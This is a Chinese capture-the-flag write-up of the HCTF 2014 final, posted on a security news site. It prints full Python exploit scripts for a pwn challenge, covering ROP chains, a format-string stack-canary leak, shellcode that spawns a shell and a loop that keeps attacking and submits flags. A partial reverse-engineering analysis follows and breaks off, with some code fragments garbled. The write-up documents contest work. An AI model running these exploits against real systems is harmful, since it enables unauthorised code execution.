# 【全网首发】HCTF FINAL 2014 writeup完美通关攻略
|
##### 译文声明
本文是翻译文章，文章来源：360安全播报
译文仅供参考，具体内容表达以及含义原文为准。
感谢白帽子@[D3AdCa7](http://weibo.com/n/D3AdCa7?from=feed&loc=at)的投稿，以下内容供安全爱好者参考学习，本文获得投稿奖励500元，即将打入作者账户，投稿请发送邮件至
huangyuan#360.cn。
HCTF线下决赛在前两天结束咯，首先附上最后的scoreboard：
狗我所在的233队最终以3525分拿下第一。
首先讲一下这次比赛的模式，分为5个route，除了第一个route外，每个route有个入口题目，做出一个入口题目之后才能向下进行。
第一个route是个pwn题，会每5分钟更新一个flag，一个flag价值15分。
第二个route的第一题是个逆向题（babycrack2），第二题是个奇怪的web题。
第三个route的第一题是个windows驱动题，第二题是个web题。
第四个route的第一题是个PPC题，内容是一个连连看。第二题是一个web题。
第五个route的第一题是个流量分析题，第二题是个web题。
其中队友搞定了pwn题，逆向题，PPC题和第二个route的第二个奇怪的web题，我搞定了流量分析题和余下的web题，分别拿下2225分和1300分。
******我是分割线******
按照题目来：
第一个route是个pwn题，qoobee，附上队友的一系列攻击代码。
bot.py
    #!/usr/bin/python
    import sys, requests, time, traceback
    def submit_flag(flag):
       data = {'userkey': flag}
       with open('session.txt','rt') as fp:
           cookie = fp.read().strip()
       r = requests.post('http://10.12.15.17/platform/check', data=data, headers={'Cookie': cookie, 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0'})
       msg = r.text[r.text.find("alert('")+7:r.text.find("')")]
       print 'Message:', msg
       return True if msg == 'NICELY DONE' else False
    from printf import *
    if __name__ == '__main__':
       ip, port = sys.argv[2], int(sys.argv[3])
       mod = sys.argv[1]
       while True:
           try:
              print 'Pwning target', ip, port
              for flag in pwn(ip, port):
                  if flag is None:
                     print 'Failed, retry now.'
                     continue
                  else:
                     print 'Gotta flag: ', flag
                     if submit_flag(flag):
                         print 'SCORED.'
                     else:
                         pass
                  time.sleep(5.0)
           except:
              print 'Exceptions in pwning thread: '
              traceback.print_exc()
              continue
danteng.py
    #!/usr/bin/python
    from zio import *
    def pwn(ip, port):
       io = zio((ip, port), timeout=100000, print_write=COLORED(REPR))#, print_read=None, print_write=None)
       #io = zio('./qoobee3')
       shellcode = "x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
       io.read_until('Your Choice')
       io.writeline('-214')
       io.writeline('hehehe')
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('LeoC')
       io.read_until('Age:')
       io.writeline('-2147483648')
       io.read_until(':')
       io.writeline('Fatty Qoobee Long')
       io.gdb_hint([])
       io.writeline('5')
       mmap = 0x8048730
       read = 0x8048660
       popret = 0x804994b
       skip7 = 0x8049945
       rop_chain = [
                     0x23330000,
                     popret,
                     0x80000000,
                     mmap,
                     skip7, 0x23330000, 0x1000, 0x7, 0x32, 0xFFFFFFFF, 0x0,
                     0, # padding
                     read, 0x23330000, 0, 0x23330000, len(shellcode)
              ]
       for i in xrange(18,18+len(rop_chain)):
           io.read_until('Which one')
           io.writeline('%d' % i)
           io.read_until('How long')
           t = rop_chain[i-18]
           if t > 2147483647:
              t -= 0x100000000
           io.writeline(str(t))
       io.read_until('Which one')
       io.writeline('99')
       io.read_until('Total Money')
       io.writeline(shellcode)
       io.writeline('echo --Lchan--')
       io.writeline('cat /home/qoobee/flag')
       io.read_until('--Lchan--')
       io.readline()
       flag = io.readline()
       if len(flag) == 0: return None
       return flag
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)
description.py
    #!/usr/bin/python
    from zio import *
    def pwn(ip, port):
       io = zio((ip, port), timeout=100000, print_write=COLORED(REPR))#, print_read=None, print_write=None)
       #io = zio('./qoobee3')
       shellcode = "x31xc9xf7xe1xb0x0bx51x68x2fx2fx73x68x68x2fx62x69x6ex89xe3xcdx80"
       io.read_until('Your Choice')
       io.writeline('-214')
       io.read_until('real')
       io.writeline('hehehe')
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('loli')
       io.read_until('Age:')
       io.writeline('10080')
       io.read_until(':')
       io.writeline('%11$08x')
       io.read_until('Your Choice')
       io.writeline('2')
       io.read_until('Description: ')
       canary = int(io.readline(),16)
       print 'Leaked stack canary:', hex(canary)
       io.gdb_hint([])
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('loli')
       io.read_until('Age:')
       io.writeline('10080')
       io.read_until('Description')
       mmap = 0x8048730
       read = 0x8048660
       popret = 0x80498a6
       skip7 = 0x8049885
       main = 0x80488DB
       rop_chain = [
                     mmap,
                     skip7, 0x23330000, 0x1000, 0x7, 0x32, 0xFFFFFFFF, 0x0,
                     0,
                     main
    #                read, 0x23330000, 0, 0x23330000, len(shellcode)
              ]
       rop = ''
       for x in rop_chain:
           rop += l32(x)
       print 'ROP chain length: ', len(rop)
       payload = 'R' * 30 + l32(canary) + l32(0) + l32(0) + l32(0xeebbeebb) + rop
       io.writeline(payload)
       io.read_until('Your Choice')
       io.writeline('1')
       io.read_until('Name:')
       io.writeline('loli')
       io.read_until('Age:')
       io.writeline('10080')
       io.read_until('Description')
       rop_chain = [
                     read, 0x23330000, 0, 0x23330000, len(shellcode)
                  ]
       rop = ''
       for x in rop_chain:
           rop += l32(x)
       print 'Stage 2 chain length: ', len(rop)
       payload = 'R' * 30 + l32(canary) + l32(0) + l32(0) + l32(0xeebbeebb) + rop
       io.writeline(payload)
       io.writeline(shellcode)
       while True:
           io.writeline('echo --Lchan--')
           io.writeline('cat /home/qoobee/flag')
           io.read_until('--Lchan--')
           io.readline()
           flag = io.readline()
           if len(flag) == 0: yield None
           else: yield flag
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)
naive.py
    #!/usr/bin/python
    from zio import *
    def pwn(ip, port):
       io = zio((ip, port), timeout=4)#, print_read=None, print_write=None)
       io.writeline('-214')
       shellcode = 'PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIFQkyHwhah0vk0QaxtoDorSCX1xDobB59rNlIXcHMOpAA'
       io.writeline(shellcode + 'ymkelwin')
       io.writeline('echo --Lchan--')
       io.writeline('cat /home/qoobee/flag')
       io.read_until('--Lchan--')
       io.readline()
       flag = io.readline()
       return flag
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)
    navier.py
    #!/usr/bin/python
    from zio import *
    def pwn(ip, port):
       io = zio((ip, port), timeout=4, print_write=COLORED(REPR))#, print_read=None, print_write=None)
       io.read_until('Your Choice')
       io.writeline('-214')
       shellcode = "x4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4ax4a" + "x4ax4ax4ax37x52x59x6ax41x58x50x30x41x30x41" + "x6bx41x41x51x32x41x42x32x42x42x30x42x42x41" +    "x42x58x50x38x41x42x75x4ax49x74x71x79x59x68" +    "x77x78x61x58x30x34x4bx43x61x33x58x46x4fx34" +    "x6fx61x63x71x78x33x58x46x4fx73x52x35x39x30" +    "x6ex6ex69x4bx53x5ax6dx4fx70x41x41"
       io.writeline(shellcode + 'ymkelwin')
       io.gdb_hint([])
       io.read_until('Your Choice')
       io.writeline('1')
       calledx = 0x080488D0
       io.read_until('Name:')
       io.writeline('R' * 0x40 + l32(calledx))
       io.read_until('Age:')
       io.writeline('-2147483648')
       io.writeline('echo --Lchan--')
       io.writeline('cat /home/qoobee/flag')
       io.read_until('--Lchan--')
       io.readline()
       flag = io.readline()
       return flag
    if __name__ == '__main__':
       print 'Flag: ', pwn('10.11.12.13',1415)
然后是route2的第一题，逆向babycrack2。
简单逆向后可以看出，程序对输入的flag先做了如下验证：
1\. 要求strlen为19，恰有三位是数字。
2\. 要求`flag[17] > 0x20 && flag[17]  0; --i)
        content[i] ^= content[i - 1];
      for(int i = 0; i < 166; ++i)
      {
        if(i % 2 && i % 5)
        {
          if(i % 3)
            content[i] ^= flag[16];
          else
            content[i] -= flag[17];
        }
        else
        {
          content[i] += flag[16];
        }
      }
      return 0;
    }
“`
注意到第一部分计算与flag无关，我们观察第一部分解密之后的数据：
“`
    0000000: e520 9825 9f95 956b 9d21 4ef8 112e 9c75  . .%...k.!N....u
    0000010: 7e5d d26b 9521 776b 9595 9921 956b fd0e  ~].k.!wk...!.k..
    0000020: fd86 787a 776e d79e 1246 876b ddc0 9dd0  ..xzwn...F.k....
    0000030: 7c8c 3c49 7d43 adaf bc47 eaad 5072 7b86  |.<I}C...G..Pr{.